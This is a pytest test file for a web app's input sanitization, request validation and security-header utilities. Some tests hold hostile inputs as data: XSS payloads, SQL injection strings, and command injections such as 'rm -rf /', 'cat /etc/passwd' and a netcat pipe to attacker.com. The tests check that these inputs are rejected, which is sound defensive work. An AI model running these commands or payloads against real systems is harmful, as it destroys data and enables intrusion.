"""
Tests for input validation and sanitization utilities.
"""

import pytest
import json
from fastapi import HTTPException
from pydantic import BaseModel, Field

from app.core.validation import InputSanitizer, RequestValidator, SecurityHeaders


class TestInputSanitizer:
    """Test cases for InputSanitizer."""
    
    def test_sanitize_text_basic(self):
        """Test basic text sanitization."""
        # Normal text should pass through
        text = "Hello, this is a normal message."
        result = InputSanitizer.sanitize_text(text)
        assert result == text
        
        # HTML should be escaped
        html_text = "<p>Hello <b>world</b></p>"
        result = InputSanitizer.sanitize_text(html_text)
        assert "&lt;p&gt;" in result
        assert "&lt;b&gt;" in result
        assert "&lt;/b&gt;" in result
        assert "&lt;/p&gt;" in result
    
    def test_sanitize_text_dangerous_patterns(self):
        """Test removal of dangerous patterns."""
        # Script tags should be removed
        script_text = "Hello <script>alert('xss')</script> world"
        result = InputSanitizer.sanitize_text(script_text)
        # After HTML escaping and pattern removal, script content should be gone
        assert "alert" not in result.lower()
        
        # JavaScript URLs should be removed
        js_text = "Click here: javascript:alert('xss')"
        result = InputSanitizer.sanitize_text(js_text)
        assert "javascript:" not in result.lower()
        
        # Event handlers should be removed
        event_text = "Hello <div onload='alert(1)'>world</div>"
        result = InputSanitizer.sanitize_text(event_text)
        assert "onload" not in result.lower()
    
    def test_sanitize_text_sql_injection(self):
        """Test SQL injection detection."""
        # SQL injection attempts should raise ValueError
        sql_texts = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "UNION SELECT * FROM passwords",
            "'; DELETE FROM sessions; --"
        ]
        
        for sql_text in sql_texts:
            with pytest.raises(ValueError, match="Potentially malicious input detected"):
                InputSanitizer.sanitize_text(sql_text)
    
    def test_sanitize_text_command_injection(self):
        """Test command injection detection."""
        # Command injection attempts should raise ValueError
        cmd_texts = [
            "; rm -rf /",
            "&& cat /etc/passwd",
            "| nc attacker.com 4444",
            "`whoami`",
            "$(id)"
        ]
        
        for cmd_text in cmd_texts:
            with pytest.raises(ValueError, match="Potentially malicious input detected"):
                InputSanitizer.sanitize_text(cmd_text)
    
    def test_sanitize_text_length_limit(self):
        """Test text length validation."""
        # Text within limit should pass
        short_text = "a" * 100
        result = InputSanitizer.sanitize_text(short_text, max_length=200)
        assert result == short_text
        
        # Text exceeding limit should raise ValueError
        long_text = "a" * 1000
        with pytest.raises(ValueError, match="Text too long"):
            InputSanitizer.sanitize_text(long_text, max_length=500)
    
    def test_sanitize_text_invalid_input(self):
        """Test invalid input types."""
        # Non-string input should raise ValueError
        with pytest.raises(ValueError, match="Input must be a string"):
            InputSanitizer.sanitize_text(123)
        
        with pytest.raises(ValueError, match="Input must be a string"):
            InputSanitizer.sanitize_text(None)
    
    def test_sanitize_session_id_valid(self):
        """Test valid session ID sanitization."""
        # Valid session IDs should pass
        valid_ids = [
            "session-123",
            "user_session_456",
            "SESSION-ABC-123",
            "test123"
        ]
        
        for session_id in valid_ids:
            result = InputSanitizer.sanitize_session_id(session_id)
            assert result == session_id
    
    def test_sanitize_session_id_invalid(self):
        """Test invalid session ID validation."""
        # Invalid session IDs should raise ValueError
        invalid_ids = [
            "",  # Empty
            " ",  # Whitespace only
            "session with spaces",  # Contains spaces
            "session@123",  # Contains special characters
            "session.123",  # Contains dots
            "a" * 101  # Too long
        ]
        
        for session_id in invalid_ids:
            with pytest.raises(ValueError):
                InputSanitizer.sanitize_session_id(session_id)
    
    def test_sanitize_session_id_non_string(self):
        """Test non-string session ID input."""
        with pytest.raises(ValueError, match="Session ID must be a string"):
            InputSanitizer.sanitize_session_id(123)
    
    def test_validate_language_valid(self):
        """Test valid language validation."""
        valid_languages = ["en", "hi", "hinglish"]
        
        for lang in valid_languages:
            result = InputSanitizer.validate_language(lang)
            assert result == lang
    
    def test_validate_language_invalid(self):
        """Test invalid language validation."""
        invalid_languages = ["fr", "es", "de", "invalid"]
        
        for lang in invalid_languages:
            with pytest.raises(ValueError, match="Language must be one of"):
                InputSanitizer.validate_language(lang)
    
    def test_validate_ip_address_valid(self):
        """Test valid IP address validation."""
        valid_ips = [
            "127.0.0.1",
            "192.168.1.1",
            "10.0.0.1",
            "255.255.255.255",
            "0.0.0.0"
        ]
        
        for ip in valid_ips:
            result = InputSanitizer.validate_ip_address(ip)
            assert result is True
    
    def test_validate_ip_address_invalid(self):
        """Test invalid IP address validation."""
        invalid_ips = [
            "256.1.1.1",  # Invalid octet
            "192.168.1",  # Incomplete
            "192.168.1.1.1",  # Too many octets
            "not.an.ip.address",  # Non-numeric
            "192.168.01.1",  # Leading zeros
            ""  # Empty
        ]
        
        for ip in invalid_ips:
            result = InputSanitizer.validate_ip_address(ip)
            assert result is False
    
    def test_sanitize_metadata_valid(self):
        """Test valid metadata sanitization."""
        metadata = {
            "userAgent": "Mozilla/5.0",
            "platform": "Windows",
            "version": "1.0",
            "count": 42,
            "enabled": True,
            "optional": None
        }
        
        result = InputSanitizer.sanitize_metadata(metadata)
        
        # String values should be sanitized
        assert result["userAgent"] == "Mozilla/5.0"
        assert result["platform"] == "Windows"
        assert result["version"] == "1.0"
        
        # Other types should pass through
        assert result["count"] == 42
        assert result["enabled"] is True
        assert result["optional"] is None
    
    def test_sanitize_metadata_malicious(self):
        """Test metadata with malicious content."""
        metadata = {
            "userAgent": "<script>alert('xss')</script>",
            "platform": "'; DROP TABLE users; --"
        }
        
        with pytest.raises(ValueError):
            InputSanitizer.sanitize_metadata(metadata)
    
    def test_sanitize_metadata_invalid_type(self):
        """Test metadata with invalid type."""
        with pytest.raises(ValueError, match="Metadata must be a dictionary"):
            InputSanitizer.sanitize_metadata("not a dict")


class TestRequestValidator:
    """Test cases for RequestValidator."""
    
    def test_validate_json_payload_valid(self):
        """Test valid JSON payload validation."""
        valid_json = '{"message": "Hello", "count": 42}'
        result = RequestValidator.validate_json_payload(valid_json)
        
        assert result == {"message": "Hello", "count": 42}
    
    def test_validate_json_payload_invalid(self):
        """Test invalid JSON payload validation."""
        invalid_json = '{"message": "Hello", "count": 42'  # Missing closing brace
        
        with pytest.raises(HTTPException) as exc_info:
            RequestValidator.validate_json_payload(invalid_json)
        
        assert exc_info.value.status_code == 400
        assert "Invalid JSON format" in str(exc_info.value.detail)
    
    def test_validate_json_payload_too_large(self):
        """Test JSON payload size limit."""
        large_json = '{"data": "' + "a" * 1000000 + '"}'  # Very large payload
        
        with pytest.raises(HTTPException) as exc_info:
            RequestValidator.validate_json_payload(large_json, max_size=1000)
        
        assert exc_info.value.status_code == 413
        assert "Request payload too large" in str(exc_info.value.detail)
    
    def test_validate_content_type_valid(self):
        """Test valid content type validation."""
        valid_types = [
            "application/json",
            "application/json; charset=utf-8"
        ]
        
        for content_type in valid_types:
            # Should not raise exception
            RequestValidator.validate_content_type(content_type)
    
    def test_validate_content_type_invalid(self):
        """Test invalid content type validation."""
        invalid_types = [
            "text/plain",
            "application/xml",
            "multipart/form-data"
        ]
        
        for content_type in invalid_types:
            with pytest.raises(HTTPException) as exc_info:
                RequestValidator.validate_content_type(content_type)
            
            assert exc_info.value.status_code == 415
            assert "Unsupported Content-Type" in str(exc_info.value.detail)
    
    def test_validate_content_type_missing(self):
        """Test missing content type validation."""
        with pytest.raises(HTTPException) as exc_info:
            RequestValidator.validate_content_type(None)
        
        assert exc_info.value.status_code == 400
        assert "Missing Content-Type header" in str(exc_info.value.detail)
    
    def test_validate_user_agent_valid(self):
        """Test valid user agent validation."""
        valid_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "curl/7.68.0",
            "Python/3.9 requests/2.25.1"
        ]
        
        for agent in valid_agents:
            result = RequestValidator.validate_user_agent(agent)
            assert result == agent
    
    def test_validate_user_agent_none(self):
        """Test None user agent validation."""
        result = RequestValidator.validate_user_agent(None)
        assert result is None
    
    def test_validate_user_agent_too_long(self):
        """Test user agent length limit."""
        long_agent = "a" * 1000
        result = RequestValidator.validate_user_agent(long_agent)
        
        # Should be truncated to 500 characters
        assert len(result) == 500
        assert result == "a" * 500
    
    def test_validate_pydantic_model_valid(self):
        """Test valid Pydantic model validation."""
        class TestModel(BaseModel):
            name: str = Field(..., min_length=1)
            age: int = Field(..., ge=0)
        
        valid_data = {"name": "John", "age": 30}
        result = RequestValidator.validate_pydantic_model(TestModel, valid_data)
        
        assert isinstance(result, TestModel)
        assert result.name == "John"
        assert result.age == 30
    
    def test_validate_pydantic_model_invalid(self):
        """Test invalid Pydantic model validation."""
        class TestModel(BaseModel):
            name: str = Field(..., min_length=1)
            age: int = Field(..., ge=0)
        
        invalid_data = {"name": "", "age": -5}  # Invalid values
        
        with pytest.raises(HTTPException) as exc_info:
            RequestValidator.validate_pydantic_model(TestModel, invalid_data)
        
        assert exc_info.value.status_code == 400
        assert "Validation error" in str(exc_info.value.detail["message"])
        assert "errors" in exc_info.value.detail


class TestSecurityHeaders:
    """Test cases for SecurityHeaders."""
    
    def test_get_security_headers(self):
        """Test security headers generation."""
        headers = SecurityHeaders.get_security_headers()
        
        # Check required security headers
        assert "X-Content-Type-Options" in headers
        assert "X-Frame-Options" in headers
        assert "X-XSS-Protection" in headers
        assert "Strict-Transport-Security" in headers
        assert "Referrer-Policy" in headers
        assert "Content-Security-Policy" in headers
        assert "Permissions-Policy" in headers
        
        # Check header values
        assert headers["X-Content-Type-Options"] == "nosniff"
        assert headers["X-Frame-Options"] == "DENY"
        assert headers["X-XSS-Protection"] == "1; mode=block"
        assert "max-age=31536000" in headers["Strict-Transport-Security"]
    
    def test_get_cors_headers(self):
        """Test CORS headers generation."""
        headers = SecurityHeaders.get_cors_headers()
        
        # Check required CORS headers
        assert "Access-Control-Allow-Origin" in headers
        assert "Access-Control-Allow-Methods" in headers
        assert "Access-Control-Allow-Headers" in headers
        assert "Access-Control-Max-Age" in headers
        
        # Check header values
        assert headers["Access-Control-Allow-Origin"] == "https://hackathon.guvi.in"
        assert "GET" in headers["Access-Control-Allow-Methods"]
        assert "POST" in headers["Access-Control-Allow-Methods"]
        assert "x-api-key" in headers["Access-Control-Allow-Headers"]
        assert "content-type" in headers["Access-Control-Allow-Headers"]